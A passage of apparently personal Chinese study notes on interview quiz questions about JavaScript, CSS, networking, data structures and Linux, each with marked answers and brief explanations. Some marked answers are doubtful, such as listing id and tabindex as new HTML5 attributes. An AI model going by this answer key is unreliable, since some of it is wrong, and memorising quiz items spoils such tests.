        b1: "b1",
        b2: "b2"
    },
    a3: undefined,
    a4: null,
    a5: 1
};
var b = func(a);
console.log(b);
```

A. {a1: "a1", a2: {b1: "b1", b2: "b2"}, a3: undefined, a4: null, a5: 1}     ⚠️

B. {a1: "a1", a2: {b1: "b1", b2: "b2"}, a3: null, a4: null, a5: 1}

C. {a1: "a1", a2: {b1: "b1", b2: "b2"}, a3: undefined, a4: undefined, a5: 1}

D. {a1: "a1", a2: {b1: "b1", b2: "b2"}, a3: undefined, a4: {}, a5: 1}      ✅

解析: 

注意 `typeof null === 'object'`

## 下列布局在页面上的宽度比是多少？

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .flex {
            display: flex;
            width: 200px;
            height: 100px;
        }
        .left {
            flex: 3 0 50px;
            background: red;
        }
        .right {
            flex: 2 0 100px;
            background: blue;
        }
    </style>
</head>
<body>
    <div class="flex">
        <div class="left"></div>
        <div class="right"></div>
    </div>
</body>

</html>
```

计算方式:

首先去掉各自的基础宽度(`left: 50px, right: 100px`), 获得到一个按比例分配的长度为 `200px - 50px - 100px = 50px`

所以`left`为: `50 *  3/5 + 50 = 80px`

所以`right`为: `50 * 2/5 + 100 = 120px`

所以`left:right` = `80:120` = `2:3`

## 下面代码的输出是：

```js
// 下面代码的输出是：
const arr = [];
const testObj = {};
console.log(arr === "");
console.log(arr == "");
arr.toString = () => 1;
console.log(arr === 1);
console.log(arr == 1);
arr.valueOf = () => 2;
console.log(arr == 2);
arr.valueOf = () => testObj;
console.log(arr == testObj);
```

解析: 

```js
const arr = [];
const testObj = {};
console.log(arr === "");  // false 类型不同
console.log(arr == "");   // true 因为arr是对象,会调用toString()进行比较

// console.log(11 == '11');  // true 11是数字，字符串转数字进行比较
// console.log([11] == 11);  // true [11]是对象,会调用toString()进行比较  🌿

arr.toString = () => 1;
console.log(arr === 1);  // false 类型不同
console.log(arr == 1);   // true 因为 arr.toString = () => 1; 给arr的toString方法重写了

// console.log([11].valueOf());   // [11] 
// console.log([11].valueOf() == 11);   // true 说明这里在比较之前,[11].valueOf()对象先调用了toString()  🌿

arr.valueOf = () => 2;   
console.log(arr == 2);   // true  与数值比较,优先调用 valueOf 方法
arr.valueOf = () => testObj;
console.log(arr == testObj);  // false 这里是两个引用类型的比较,所以arr根本不会调用valueOf方法,直接对两个引用类型进行地址比较

// console.log(Boolean(""));  // false
// console.log(Boolean([]));  // true
// console.log(Boolean([]) == Boolean(""));  // false
```

参考: [登录—专业IT笔试面试备考平台_牛客网](https://www.nowcoder.com/test/question/done?tid=54252212&qid=800717#summary)

## 下面代码的输出是：

```js
// 下面代码的输出是：
let a = 0;
const obj = {
    a: 1,
    b: function () {
        console.log(this.a);
    }
}
const obj1 = {
    a: 2
}
const fun = obj.b;
fun();
fun.apply(obj);
fun.bind(obj1).apply(obj);
const fun1 = fun.bind(obj1);
new fun();
```

```js
undefined 1 2 undefined
```

解释: 

```js
let a = 0;
const obj = {
    a: 1,
    b: function () {
        console.log(this.a);
    }
}
const obj1 = {
    a: 2
}
const fun = obj.b;
fun();   // undefined ==> let、const、class声明的全局变量不属于顶层对象(window)
fun.apply(obj);  // 1 ==> apply绑定obj对象
fun.bind(obj1).apply(obj);  // 2 ==> bind的绑定不执行,而且this指向绑定后不可更改
const fun1 = fun.bind(obj1);  
new fun();  // undefined ==> 此时的this指向新创建的对象,但是这个新对象中没有属性
```

## 以下关于cookie和localStorage描述正确的是

A. localStorage 和 cookie 一样也有跨域限制     ✅

B. localStorage 可以和cookie 一样通过特殊的http 头部由服务端进行设置

C. localStorage无法被用户清除，所以比Cookie更安全，可以放置重要数据

D. cookie 和 localStorage 都可以由浏览器自动携带在http请求的header中传递给服务端

## 跨域请求中，需要设置哪个属性为true,才能携带cookie信息？

A. responseType

B. timeout

C. withCookies     ⚠️

D. withCredentials     ✅

解析: [登录—专业IT笔试面试备考平台_牛客网](https://www.nowcoder.com/test/question/done?tid=54305674&qid=800589#summary)

## 下面代码的输出顺序(关于Promise和async的,很强!!)

```js
async function async1() {
    console.log('async1 start');
    await async2();
    console.log('async1 end');
}
async function async2() {
    console.log('async2');
}
console.log('script start');
setTimeout(() => {
    console.log('setTimeout');
}, 0);
async1();
new Promise((resolve, reject) => {
    console.log('promise1');
    resolve();
}).then(res => {
    console.log('promise2');
})
console.log('script end');
```

当前理解(2022.3.28)

```js
async function async1() {
    console.log('async1 start');
    await async2();
    console.log('async1 end');
}
async function async2() {
    console.log('async2');
}

console.log('script start');
setTimeout(() => {
    console.log('setTimeout');
}, 0);
async1();
new Promise((resolve, reject) => {
    console.log('promise1');
    resolve();
}).then(res => {
    console.log('promise2');
})
console.log('script end');

// script start
// async1 start
// async2    // await 后面的 async2() 相当于是一个 Promise ,所以 async2 是同步代码
// promise1
// script end
// ----------  以上都是同步代码 ----------
// async1 end  // await 后面的这个地方等价于是 Promise.then 
// promise2    // Promise.then
// setTimeout  // 宏任务
```

## 关于查找，下列说法正确的是____。

A. 红黑树、B树、B+树均是自平衡树。     ✅

B. 散列表的冲突通常可以用拉链法解决。    ✅

C. 二叉搜索树只能用树状的数据结构实现。

D. 二分查找要求线性表存储的值是有序的。   ✅

## HTML5相对于原来的HTML规范有哪些改进：

A. 新增了一些语义化标签，如article,header,footer,dialog等     ✅

B. 新的全局属性：id, tabindex, repeat      ✅

C. 新增了一些高级标签，如`<game>,<audio>,<canvas>`

D. DOCTYPE更简洁       ✅

## 以下方法中涉及跨域的是

A. window.onerror    ⚠️

B. window.name    ✅

C. window.history

D. window.addeventListener

解析: [九种跨域方式实现原理（完整版） - 掘金](https://juejin.cn/post/6844903767226351623)

补充: **location.hash、document.domain**

## HTTP状态码503表示的含义是（）？

A. Unauthorized

B. Bad Request

C. Internal Server Error  ⚠️

D. Service Unavailable   ✅

解析: 

1. 500 Internal Server Error
2. 502 Bad GateWay
3. 503 Service Unavailable

## 问class为main的div的高度是？

```html
<style>
    .main div {
        font-size: 14px;
        height: 12px;
    }
    .title {
        position: absolute;
        height: 20px;
    }
    .test {
        height: 20px;
    }
    .test2 {
        visibility: hidden;
    }
    .test3 {
        display: none;
    }
</style>
<div class="main">
    <div class="title">title</div>
    <div class="test">test</div>
    <div class="test2">test2</div>
    <div class="test3">test3</div>
</div>
```

解析:

1. title那个脱离文档流,不用管

2. test3那个不占用物理空间,也不用管

3. test2占用物理空间,高度随父元素为12px

4. 看代码
   
   ```css
   .main div {
      font-size: 14px;
      height: 12px;
   }
   .test {
      height: 20px;
   }
   /* 
       这两个选择器都同时作用于: <div class="test">test</div>
       但是第一个的css权重更大
   */
   ```

## 以下哪些协议工作在应用层？

A. ICMP   ⚠️

B. SMTP    ✅

C. ARP

D. FTP    ✅

总结: 

工作在<mark>应用层</mark>的协议有: 

1. HTTP

2. FTP

3. DNS

4. SMTP  ⚠️

5. WebSocket

6. POP3

7. SNMP

工作在<mark>网络层</mark>的协议有:

1. ICMP   ⚠️

2. IGMP   ⚠️

3. ARP   ⚠️

4. IP

## 下列红黑树的说法，错误的是：

A. 红黑树的时间复杂度为：O(n*lgn)。  ✅

B. 每个叶子节点是黑色的。

C. 每个红色结点的两个子结点一定都是黑色。

D. 根节点是黑色，每个节点是黑色或者红色。 

解析:

红黑树的时间复杂度为：O(lgn)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0r08f9r0sj21vf0u0juz.jpg)

## 如果设置网页除了input和textarea里面的文字不能被选中拷贝以下那些选项是正确的？

A. `*:not(input),*:not(textarea){ user-select:none;}`

B. `*:not(input):not(textarea){ user-select:none;}`      ✅

C. `:not(input),:not(textarea) { user-select:none;}`

D. `::not(input),::not(textarea){ user-select:none;}`

解析: 

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        *:not(input):not(textarea) {
            user-select: none;
        }
    </style>
</head>
<body>
    <input type="text">
    <textarea name="" id="" cols="30" rows="10"></textarea>

    <!-- 不能被选中 -->
    <div>1231232</div>   
</body>
</html>
```

## 一棵哈夫曼树有5个叶子节点，则该哈夫曼树共有（）个结点？

答案: 9

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0qzrkvrtuj20w60u0wh0.jpg)

参考: [哈夫曼树（赫夫曼树、最优树）详解](http://c.biancheng.net/view/3398.html)

## 下面哪个方法不能创建节点？

A. document.createElement()

B. element.createChild()       ✅

C. document.createTextNode()

D. element.appendChild() 

解析: 根本就没有`createChild`这个方法!! 我giao

## NumberList是一个顺序容器，以下代码执行后，NumberList里的元素依次为（）

```java
List<int> NumberList = new List<int>(){2,4,1,3,5};
for(int i = 0;i<NumberList.Count;++i)
{
    int v = NumberList[i];
    if(v%2 == 0) {
        NumberList.Remove(v);   //删除的是元素，而非下标
    }
}
```

A. 2,1,3,5

B. 2,4,1,3,5

C. 1,3,5   ⚠️

D. 4,1,3,5    ✅

解析: 注意陷阱!!!

这道题都说了<mark>删除的是元素，而非下标</mark>,那么数组 NumberList 的长度是在变化的,所以这个过程删除的时候会把 4 漏掉.可以自己试着验算一下.

## 请说出 \W 的含义

`匹配任何非单词字符`

参考: [正则表达式 &#8211; 元字符 | 菜鸟教程](https://www.runoob.com/regexp/regexp-metachar.html)

## Why <hr> tag is used in HTML page?

A. For creating table

B. None

C. For thematic break   ✅

D. For heading

解析: `thematic 主题的`

水平分隔线（horizontal rule）可以在*视觉上*将文档分隔成各个部分。

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <div>11111</div>
    <div>22222</div>
    <hr>
    <div>3333</div>
</body>

</html>
```

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0qluou49gj20o40ewmy1.jpg)

## ::before和:after中单双冒号错误的是

A. 兼容IE浏览器，建议用双冒号写法比较安全。   ✅

B. 单冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。

C. 对于CSS2之前已有的伪元素，比如:before，单冒号和双冒号的写法::before作用是一样的。     ⚠️

D. 双冒号是在css3规范中引入的，用于区分伪类和伪元素。

## JavaScript中有哪几种不同类型的错误：

1. Load time errors

2. Run time errors

3. Logical Errors

## 下面关于angular，vue，react说法正确的是（ ）

A. 都默认使用双向数据绑定

B. 自身都有过滤器

C. 都可以使用虚拟Dom   ✅

D. 都是MVVM模式

## 关于如下代码，说法正确的是

```js
关于如下代码，说法正确的是:
1、@interface MyClass : NSObject
2、{
3、   int count;
4、   id data;
5、   NSString* name;  
6、}
7、-(id)initWithString:(NSString*)aName;
8、+(MyClass*)createMyClassWithString:(NSString*)aName;
9、@end
```

A. 定义了3个成员变量：count、data和name(@protected)     ✅

B. 声明了两个方法     ✅

C. 名为MyClass的类，继承于Cocoa框架中的NSObject类    ✅   ⚠️

D. 7,8行代码有误

## TCP协议的拥塞控制就是防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。常用的方法有:

1. 快重传、快恢复

2. 慢开始、拥塞控制

## 如何在多线程中避免发生死锁？

A. 进程在运行前一次性地向系统申请它所需要的全部资源。  ✅

B. 允许进程强行从占有者那里夺取某些资源。  ✅

C. 把资源事先分类编号，按号分配，使进程在申请，占用资源时不会形成环路。  ✅

D. 允许进程同时访问某些资源。 ✅

解析: 破坏四个必要情况,即可

1. 互斥使用

2. 请求和保持

3. 不可抢占

4. 循环等待

## 已知message是一个字符串，以下VUE数据绑定写法能正确显示的是（   ）

A. `<span>{{message}}</span>`    ✅

B. `<span v-model="message"></span>`

C. `<span v-html="message"></span>`      ✅

D. `<span v-bind="message"></span>`

## 兼容接口不同的类在一起工作，采用以下哪种设计模式最好？

`适配器模式`

## 下列关于Canvas和SVG图形的区别说法错误的是（）

A. Canvas和分辨率无关      

B. SVG为了之后的操作，需要记录坐标，所以比较缓慢

C. Canvas绘制的形状都能被记忆和操作

D. Canvas不能使用绘制对象的相关事件处理，因为我们没有他们的参考

选: AC

## 一台客户端有三百个客户与三百个客户端有三百个客户对服务器施压，有什么区别?

A. 用户分布在不同的客户端上，需要考虑使用调度器来整体调配不同客户机上的用户。

B. 所有用户在一个客户端上，不必考虑分布式管理的问题。   ✅

C. 300个用户在一个客户端上，需要更大的带宽。  ✅

D. 线程之间可能发生干扰，而产生一些异常。   ✅

## 网络管理员把优盘上的源代码给程序员参考，但要防止程序误删除或修改，以下正确的加载方式是（      ）

A. mount -r /dev/sdb1 /tools    ✅

B. mount -o defaults /dev/sdb1 /tools

C. mount -o ro /dev/sdb /tools

D. mount -o ro /dev/sdb1 /tools   ✅

解析: 

1、mount ：挂载 
2、-o ro ：只读；  
3、-r ：只读挂载

## 若串S=”UP！UP！JD”，则其子串的数目

`37`

解析:

n: 字符长度

计算: `n(n+1)/2 + 1`

## 在bash编程中,算术比较大于、大于等于的运算符是（   ）

`ge 和 gt`

## 下面有关值类型和引用类型描述正确的是（）？

A. 值类型数据是在栈上分配内存空间，它的变量直接包含变量的实例，使用效率相对较高。而引用类型数据是分配在堆上，引用类型的变量通常包含一个指向实例的指针，变量通过指针来引用实例。   ✅

B. 值类型变量的作用域主要是在栈上分配内存空间内，而引用类型变量作用域主要在分配的堆上。

C. 值类型的变量赋值只是进行数据复制，创建一个同值的新对象，而引用类型变量赋值，仅仅是把对象的引用的指针赋值给变量，使它们共用一个内存地址。  ✅

D. 引用类型一般都具有继承性，但是值类型一般都是封装的，因此值类型不能作为其他任何类型的基类。    ✅

## 以下哪个选项的描述是错误的

A. iframe是用来在网页中插入第三方页面，早期的页面使用iframe主要是用于导航栏这种很多页面都相同的部分，这样在切换页面的时候避免重复下载

B. iframe的创建比一般的DOM元素慢了1-2个数量级

C. iframe标签会阻塞页面的的加载   ⚠️

D. iframe本质是动态语言的Incude机制和利用ajax动态填充内容   

答案: 选 D

解析:

C 选项是对的,因为`window.onload`事件需要等待audio、iframe中的资源加载成功后才执行

## 网卡实现的主要功能是？

A. 物理层与数据链路层的功能   ✅

B. 数据链路层与网络层的功能

C. 网络层与传输层的功能

D. 传输层与应用层的功能

解析: 

网卡实现的主要功能是`物理层与数据链路层`的功能。

网卡实现的主要功能是数据的封装与解封、链路管理、编码与译码。

## 模式串的长度是m，主串的长度是n（m<n），使用KMP算法匹配的时间复杂度是（）？

`O(m + n)`
